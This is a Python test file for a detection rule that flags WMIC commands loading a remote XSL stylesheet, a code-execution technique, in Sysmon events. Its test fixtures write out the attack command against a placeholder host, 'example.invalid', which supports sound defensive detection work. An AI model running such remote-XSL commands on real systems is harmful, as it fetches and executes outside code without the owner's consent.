from pathlib import Path

from breachscope.analyzer import apply_rules
from breachscope.rules import load_rules
from breachscope.schemas import Event


ROOT = Path(__file__).resolve().parents[1]


def _rules():
    return load_rules(ROOT / "rules")


def _event(command_line: str, event_id: str = "1", source: str = "Microsoft-Windows-Sysmon") -> Event:
    return Event(
        timestamp="2026-09-08T00:00:00Z",
        host="host1",
        source=source,
        event_id=event_id,
        command_line=command_line,
        raw={},
    )


def _new_rule_matches(event: Event):
    return [
        finding
        for finding in apply_rules([event], _rules())
        if finding.rule_id == "R-WMI-XSL-Format"
    ]


def test_sysmon_event1_wmic_https_remote_xsl_matches() -> None:
    matches = _new_rule_matches(
        _event('wmic process list /format:"https://example.invalid/test.xsl"')
    )
    assert len(matches) == 1
    assert matches[0].mitre_technique == "T1047"


def test_sysmon_event1_wmic_http_remote_xsl_matches() -> None:
    matches = _new_rule_matches(
        _event('WMIC PROCESS LIST /FORMAT:"http://example.invalid/test.xsl"')
    )
    assert len(matches) == 1


def test_local_wmic_format_does_not_match_remote_xsl_rule() -> None:
    assert not _new_rule_matches(_event("wmic process list /format:htable"))


def test_wmic_without_format_does_not_match_remote_xsl_rule() -> None:
    assert not _new_rule_matches(_event("wmic process call create calc.exe"))


def test_remote_xsl_wrong_event_id_does_not_match() -> None:
    assert not _new_rule_matches(
        _event('wmic process list /format:"https://example.invalid/test.xsl"', event_id="3")
    )


def test_remote_xsl_wrong_provider_does_not_match() -> None:
    assert not _new_rule_matches(
        _event(
            'wmic process list /format:"https://example.invalid/test.xsl"',
            source="Microsoft-Windows-Security-Auditing",
        )
    )
